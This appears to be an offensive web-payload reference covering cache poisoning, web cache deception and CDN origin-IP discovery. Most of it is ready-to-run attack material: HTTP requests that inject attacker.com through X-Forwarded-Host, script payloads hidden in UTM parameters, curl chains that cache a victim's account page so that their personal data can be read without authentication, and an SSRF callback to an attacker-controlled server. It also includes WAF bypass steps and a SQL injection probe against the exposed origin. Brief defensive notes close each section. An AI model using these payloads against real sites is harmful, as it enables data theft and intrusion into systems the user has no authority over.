# Cache and CDN Security

_3 web payloads_

### Cache Poisoning  `cache-poisoning`
_Web cache poisoning attack_
Subcategory: **Cache Poisoning** · tags: `cache` `poisoning` `web-cache`

**Prerequisites:**
- Target uses caching
- Cache key is misconfigured

**Attack Chain:**

**Probe the cache**
> Probe the cache status
```
Response header: X-Cache: hit/miss
```
**Syntax breakdown:**
- `X-Cache` — cache status header _header_

**Unkeyed header**
> Inject an unkeyed header
```
X-Forwarded-Host: attacker.com
```
**Syntax breakdown:**
- `X-Forwarded-Host` — often used to build a response but not included in the cache key _header_

**Cache poisoning**
> Poison the cache
```
GET /?q=test HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
**Syntax breakdown:**
- `attacker.com` — malicious host, will be cached _domain_

**Fat GET**
> Fat GET poisoning
```
GET / HTTP/1.1
Host: target.com
Content-Length: 10

q=poisoned
```
**Syntax breakdown:**
- `Content-Length` — a GET request that includes a request body _header_

**WAF/EDR Bypass Variants:**

**Exploiting Unkeyed Headers**
> Identify HTTP headers that are not included in the cache key but affect the response content (such as X-Forwarded-Host), and store a poisoned response in the cache by repeatedly sending requests carrying the malicious header
```
# Common unkeyed headers:
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /malicious
X-Forwarded-Prefix: /evil

# Discover unkeyed headers:
# Use the Param Miner Burp extension for automatic detection
# Manual comparison: does the response change when a header is added but the cache key stays the same

# Poisoning steps:
# 1. Send requests with the malicious header until there is a cache hit
# 2. Verify that other users accessing the same URL receive the poisoned response
```
**Syntax breakdown:**
- `# Common unkeyed headers:` — primary command _command_
- `...` — 11 lines total _value_

**Parameter cloaking and HTTP/2-specific header poisoning**
> Inject malicious content by leveraging the fact that tracking parameters such as UTM are not included in the cache key, or use a Fat GET request body to override query parameters; HTTP/2-specific pseudo-headers trigger differential handling
```
# Parameter Cloaking:
# UTM parameters are usually not in the cache key:
/page?utm_content=<script>alert(1)</script>
/page?callback=alert(1)&utm_source=x

# Fat GET poisoning:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=<script>alert(1)</script>

# HTTP/2-specific headers:
:method: GET
:path: /
transfer-encoding: chunked
```
**Syntax breakdown:**
- `# Parameter Cloaking:
# UTM parameters are usually not in the cache key:
/page?utm_content=` — injected code _value_
- `<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `
/page?callback=alert(1)&utm_source=x

# Fat GET poisoning:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=` — injected code _value_
- `<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `

# HTTP/2-specific headers:
:method: GET
:path: /
transfer-encoding: chunked` — injected code _value_

**Overview:** Web cache poisoning exploits the inconsistency between a cache server's cache key and the actual response content. By injecting malicious content into HTTP headers or parameters that are not part of the cache key, an attacker makes the cache server store a response containing the malicious payload, and all subsequent users accessing the same URL will receive the poisoned response.

**Vulnerability Principle:** The root cause of cache poisoning is that the cache key usually only contains the URL path and a few parameters, while the web application may reflect non-cache-key HTTP headers (such as X-Forwarded-Host, X-Forwarded-Scheme) into the response. When an attacker injects malicious content via these headers, the cache server caches the response containing the malicious content and distributes it to all users.

**Exploitation Method:** First identify the caching mechanism used by the target (via response headers such as Cache-Control, Age, X-Cache), then use tools such as Param Miner to probe for non-cache-key HTTP headers that can be reflected into the response, construct a header value containing malicious JavaScript (e.g. X-Forwarded-Host: evil.com), send a request to make the cache store the poisoned response, and verify whether subsequent normal requests without the malicious header return the poisoned content.

**Defensive Measures:** Strictly configure the cache key to include all parameters and headers that affect the response content; perform strict input validation and encoding on HTTP header values reflected into the response; use the Vary header to correctly declare the HTTP headers that affect the response; configure the cache to not cache responses containing user-specific content; regularly audit the cache configuration and purge suspicious cache content.

---

### Cache Deception  `cache-deception`
_Exploit the difference between web caching and server path resolution to induce the CDN/cache layer to cache dynamic pages containing sensitive information_
Subcategory: **Deception** · tags: `cache` `deception` `auth`

**Prerequisites:**
- Target uses a CDN or reverse proxy cache
- A path resolution difference exists (backend ignores the path suffix)
- Cache policy is based on the URL extension

**Attack Chain:**

**Probe the cache behavior**
> Detect the target's cache layer and cache policy configuration
_platform: linux_
```
# Detect whether a cache layer exists:
curl -sI "http://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"

# Test the cache policy (whether static files are cached):
curl -sI "http://target.com/test.css" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.js" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.jpg" | grep -iE "x-cache|age"

# Compare with a dynamic page:
curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"
```
**Syntax breakdown:**
- `X-Cache` — cache hit status header (HIT/MISS) _value_
- `Age:` — the time (in seconds) the response has been stored in the cache _value_
- `Via:` — shows the intermediate proxy/cache server _value_

**Path confusion cache deception**
> Append a static file extension to a dynamic page URL to trigger caching
```
# Core trick: append a static file extension to a dynamic page URL
# The backend resolves /account/profile.css as /account (ignoring the nonexistent path)
# The cache layer sees the .css extension, treats it as a static resource, and caches it

# Step 1: construct the deception URL (accessed as the victim)
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile.css"

# Step 2: the attacker accesses the cached content directly without authentication
curl "http://target.com/account/profile.css"

# Various path variants:
curl "http://target.com/account/x.js"
curl "http://target.com/account/x.jpg"
curl "http://target.com/account/x.png"
curl "http://target.com/api/user/info/x.css"
curl "http://target.com/settings/x.svg"
```
**Syntax breakdown:**
- `/account/profile.css` — the backend resolves it as /account but the cache layer treats it as a CSS file _value_
- `.css/.js/.jpg` — common cache-triggering extensions _value_

**Advanced cache deception variants**
> Advanced cache deception exploiting path separators, parameters, and normalization differences
```
# Separator confusion (different components interpret path separators differently):
curl "http://target.com/account;x.css"
curl "http://target.com/account%23x.css"
curl "http://target.com/account%3fx.css"

# Parameter pollution:
curl "http://target.com/account?cb=123.css"
curl "http://target.com/account/..%2fstatic/x.css"

# RPO (Relative Path Overwrite):
curl "http://target.com/account/..%2f..%2fstatic/style.css"

# Normalization differences:
curl "http://target.com/account/./x.css"
curl "http://target.com/account%2fx.css"
```
**Syntax breakdown:**
- `;x.css` — the semicolon is a path parameter separator in some frameworks _value_
- `%23` — the URL encoding of #, handled differently by different components _value_
- `..%2f` — the URL encoding of ../, may bypass the cache layer's path matching _value_

**Full attack flow verification**
> Demonstrate the complete attack chain from inducing caching to stealing data
```
# Full attack demonstration:

# 1. First confirm the dynamic page contains sensitive information:
curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email|phone|address|token"

# 2. Induce the victim to access the deception URL (via a phishing email/message):
# The victim clicks: http://target.com/account/avatar.jpg
# This caches their /account page (containing personal info) as an "image"

# 3. The attacker accesses the same URL to obtain the cached sensitive information:
curl "http://target.com/account/avatar.jpg"
# Returns the victim's account page (containing email, phone number, address, etc.)

# 4. Verify the cache hit:
curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
# Expect to see: X-Cache: HIT
```
**Syntax breakdown:**
- `X-Cache: HIT` — confirms the response comes from the cache rather than the origin _value_

**WAF/EDR Bypass Variants:**

**Path separator confusion**
> Trigger caching by exploiting inconsistent parsing of separators such as semicolons, newlines, and hash marks between the cache server and origin
```
# Exploit differential parsing of path separators by the cache server
https://target.com/account/settings;.css
https://target.com/account/settings%0a.css
https://target.com/account/settings%23.css
https://target.com/account/settings%3f.css

# URL-encoded separators
https://target.com/account/settings%2f.css
https://target.com/account/settings%5c.css
```
**Syntax breakdown:**
- `# Exploit differential parsing of path separators by the cache server` — primary command _command_
- `...` — 8 lines total _value_

**RPO Relative Path Overwrite**
> Use Relative Path Overwrite (RPO) to make the browser request a sensitive page while the cache server caches it as a static resource
```
# Relative Path Overwrite
https://target.com/account/settings/..%2f..%2fstatic/style.css
https://target.com/account/settings/nonexistent.css

# Path parameter injection
https://target.com/account/settings;param=value/test.css
https://target.com/account/settings/test.js?_=1

# Manipulating different cache keys
https://target.com/account/settings HTTP/1.1
X-Original-URL: /static/style.css
```
**Syntax breakdown:**
- `# Relative Path Overwrite` — primary command _command_
- `...` — 9 lines total _value_

**Cache and origin normalization differences**
> Exploit differences in URL normalization handling between the CDN/reverse proxy and the origin to make the cache mistakenly cache sensitive content
```
# Cloudflare/Varnish path normalization differences
https://target.com/account/settings/.css
https://target.com/account/settings/test.avif
https://target.com/account/settings/x.woff2

# Double-slash confusion
https://target.com//account//settings.css
https://target.com/account/settings%252f.css

# Exploiting a missing Vary header
curl -H "Accept: text/css" https://target.com/account/settings
```
**Syntax breakdown:**
- `# Cloudflare/Varnish path normalization differences` — primary command _command_
- `...` — 9 lines total _value_

**Overview:** Web Cache Deception exploits the difference in URL path resolution between the CDN/cache layer and the backend server. When the backend handles /account/x.css as /account (returning user information) while the cache layer treats the response as a static resource due to the .css extension, an attacker can induce the victim to access the URL and then directly obtain the cached sensitive information.

**Vulnerability Principle:** The cache layer (CDN/Varnish/Nginx) and the backend application parse the same URL path differently: 1) the backend ignores nonexistent path segments in the URL 2) the cache layer decides the cache policy based on the extension 3) the cache policy does not exclude responses containing sensitive data.

**Exploitation Method:** Exploitation flow: 1) probe the cache layer and cache policy 2) find a dynamic page containing sensitive information 3) construct a deception URL with a static extension 4) induce the victim to access the URL to trigger caching 5) the attacker accesses the cache without authentication to obtain sensitive data.

**Defensive Measures:** 1) set Cache-Control: no-store, private on sensitive pages 2) the cache layer verifies that the Content-Type matches the extension 3) the backend returns 404 for nonexistent paths 4) the cache key includes Cookie/Authorization 5) configure the CDN to only cache explicit static resource paths.

---

### CDN Bypass  `cdn-bypass`
_Bypass the CDN to find the real IP_
Subcategory: **CDN** · tags: `cdn` `bypass` `recon`

**Prerequisites:**
- Target uses a CDN

**Attack Chain:**

**Historical DNS**
> Find the IP from before the CDN was used
```
# DNS history lookup to obtain the real IP:
# 1. SecurityTrails (requires an API key):
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'

# 2. ViewDNS:
curl -s "https://viewdns.info/iphistory/?domain=target.com"

# 3. DNS DB online lookup:
# https://dnsdb.io/
# https://securitytrails.com/
# https://completedns.com/

# 4. Censys search:
curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com"   -u "API_ID:API_SECRET"

# 5. Use FOFA:
# domain="target.com" && type="A"

# 6. Multi-location ping comparison:
nslookup target.com 8.8.8.8
nslookup target.com 1.1.1.1
```
**Syntax breakdown:**
- `DNS` — domain name resolution records _concept_

**Email headers**
> Examine the Received header in the email source
```
# Leak the real IP via email headers:
# 1. Trigger the target site to send an email (register/password reset/subscribe):
curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
curl -d "email=attacker@gmail.com" "http://target.com/subscribe"

# 2. View the raw headers of the received email (Gmail: Show original):
# Look for the IP in the following fields:
# Received: from mail.target.com (203.0.113.50)
# X-Originating-IP: [203.0.113.50]
# Return-Path: <noreply@target.com>

# 3. Use swaks to send an email to trigger it:
swaks --to attacker@gmail.com --from test@target.com --server target.com

# 4. Analyze the email headers:
# The bottommost Received field usually contains the origin server's real IP

# 5. If the target has RSS subscription:
# After subscribing, view the request's source IP
curl "http://target.com/rss" -v
```
**Syntax breakdown:**
- `Received` — the email transmission path _header_

**DNS history and certificate transparency lookups**
> Find the real IP behind the CDN via DNS history, certificate transparency, and search engines
```
# 1. DNS history lookup:
# SecurityTrails:
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | python3 -m json.tool

# Online lookups:
# https://viewdns.info/iphistory/?domain=target.com
# https://completedns.com/dns-history/
# https://dnshistory.org/dns-records/target.com

# 2. Certificate Transparency logs (CT Log):
curl -s "https://crt.sh/?q=target.com&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"

# 3. Censys search:
# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com

# 4. FOFA/Shodan search:
# FOFA: cert="target.com"
# Shodan: ssl.cert.subject.cn:target.com
```
**Syntax breakdown:**
- `crt.sh` — certificate transparency log search engine _value_
- `SecurityTrails` — DNS history lookup API _value_
- `cert="target.com"` — FOFA syntax to search for IPs using a specific certificate _parameter_

**Probing the real IP via subdomains and related services**
> Discover the real IP via subdomains, email records, active connections, and so on
_platform: linux_
```
# 1. Subdomains may not be behind the CDN:
for sub in mail ftp ssh vpn dev staging test api admin mx; do
  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
done

# 2. MX records (email servers usually do not go through the CDN):
dig +short target.com MX
dig +short $(dig +short target.com MX | awk '{print $2}') A

# 3. IPs in the SPF record:
dig +short target.com TXT | grep -i "spf"
# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50 may be the real IP

# 4. Trigger the target server to initiate a connection:
# Leave a URL on the target site (such as an avatar or webhook) pointing to your own server
# View the connecting IP (this is the target's outbound IP, usually the real IP):
# nc -lvp 8888

# 5. SSRF exploitation:
# If an SSRF vulnerability exists, make the server connect externally to obtain the IP
curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"
```
**Syntax breakdown:**
- `dig +short target.com MX` — query the email server records, which usually directly expose the real IP _command_
- `SPF record` — the IP allowlist contained in the email sending policy _value_

**Verify the real IP and access it directly**
> Verify candidate IPs and access them directly to bypass CDN protection
_platform: linux_
```
# 1. Verify whether the candidate IP is the real server:
REAL_IP="203.0.113.50"

# Direct IP access (Host header specifies the domain):
curl -sI "http://${REAL_IP}/" -H "Host: target.com"

# HTTPS access (ignore the certificate):
curl -sk "https://${REAL_IP}/" -H "Host: target.com"

# 2. Compare responses to confirm:
cdn_resp=$(curl -s "https://target.com/" | md5sum)
direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
echo "CDN: $cdn_resp"
echo "Direct: $direct_resp"
[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"

# 3. Modify hosts to test the CDN bypass:
echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts

# 4. Penetrate the real IP directly (bypassing the CDN's WAF):
nmap -sV -p 1-65535 ${REAL_IP}
# The CDN's WAF usually only protects the CDN entry point; accessing the real IP directly can bypass it
```
**Syntax breakdown:**
- `-H "Host: target.com"` — access via IP but specify the Host header so the server returns the correct content _parameter_
- `-sk` — -s silent mode, -k ignore certificate errors _parameter_

**WAF/EDR Bypass Variants:**

**Multiple techniques for bypassing the CDN WAF**
> Use the real IP and non-standard ports to bypass the CDN's WAF protection
```
# Once the real IP is found, the CDN's WAF is completely bypassed
# But if the target itself also has a WAF, you still need to:

# 1. Access the real IP directly (bypass the CDN WAF):
curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"

# 2. If the CDN only applies WAF to common ports:
# Scan for web services on non-standard ports:
nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP

# 3. IPv6 bypass (the CDN may only protect IPv4):
dig +short target.com AAAA
curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"

# 4. Probing the origin IP allowlist:
# Some origins are configured to only allow CDN IPs to access
# Try spoofing the CDN's IP:
curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
```
**Syntax breakdown:**
- `OR '1'='1'` — logically always true _keyword_
- `curl` — HTTP request tool _command_
- `-H` — custom request header _parameter_
- `X-Forwarded-For` — IP spoofing header _header_
- `nmap` — port scanning tool _command_

**Overview:** The CDN hides the real IP, and bypassing the CDN is an important step in penetration testing.

**Vulnerability Principle:** Information disclosure.

**Exploitation Method:** DNS history, subdomains, email headers, internet-wide scanning.

**Defensive Measures:** Only allow CDN IPs to access the origin.

---
